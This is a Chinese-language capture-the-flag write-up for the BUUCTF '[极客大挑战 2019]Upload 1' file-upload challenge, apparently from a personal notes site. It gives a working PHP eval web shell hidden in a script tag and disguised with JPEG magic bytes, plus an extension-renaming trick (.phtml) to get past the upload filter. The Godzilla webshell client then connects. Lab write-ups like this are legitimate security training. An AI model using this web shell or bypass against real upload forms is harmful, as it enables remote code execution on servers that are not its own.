---
{"dg-publish":true,"title":"BUU_[极客大挑战 2019]Upload 1","dg-path":"安全/靶场/BUU_[极客大挑战 2019]Upload 1.md","permalink":"/安全/靶场/BUU_[极客大挑战 2019]Upload 1/","dgPassFrontmatter":true}
---

# 前期测试

经过测试
![Pasted image 20240806201017.png](/img/user/picture/Pasted%20image%2020240806201017.png)
此题
+ 要上传文件类型为图片
+ 是通过文件头标志来识别文件
+ 文件中不能出现`<?`
+ 文件名后缀不能出现`php`


# 简单攻击流程

因为不能出现`<?`，所以我们上传文件内容可以考虑采用js+ php方案
```php
<script language='php'>@eval($_POST["pass"]);</script>
```

记得添加上文件头标志`FFD8FF`
![Pasted image 20240806201425.png](/img/user/picture/Pasted%20image%2020240806201425.png)


准备上传
![Pasted image 20240806201513.png](/img/user/picture/Pasted%20image%2020240806201513.png)

抓包，修改文件后缀为`.phtml`
![Pasted image 20240806201633.png](/img/user/picture/Pasted%20image%2020240806201633.png)
![Pasted image 20240806201647.png](/img/user/picture/Pasted%20image%2020240806201647.png)

常见可解析为php的文件后缀
- **.php** - 这是最常见的PHP文件后缀。
- **.php3** - 早期版本的PHP文件后缀。
- **.php4** - 用于PHP 4版本的文件后缀。
- **.php5** - 用于PHP 5版本的文件后缀。
- **.phtml** - 常用于HTML和PHP代码混合的文件后缀。
- **.phps** - 通常用于显示PHP源代码的高亮显示。


哥斯拉测试连接通过
![Pasted image 20240806201818.png](/img/user/picture/Pasted%20image%2020240806201818.png)

获得flag
![Pasted image 20240806201847.png](/img/user/picture/Pasted%20image%2020240806201847.png)
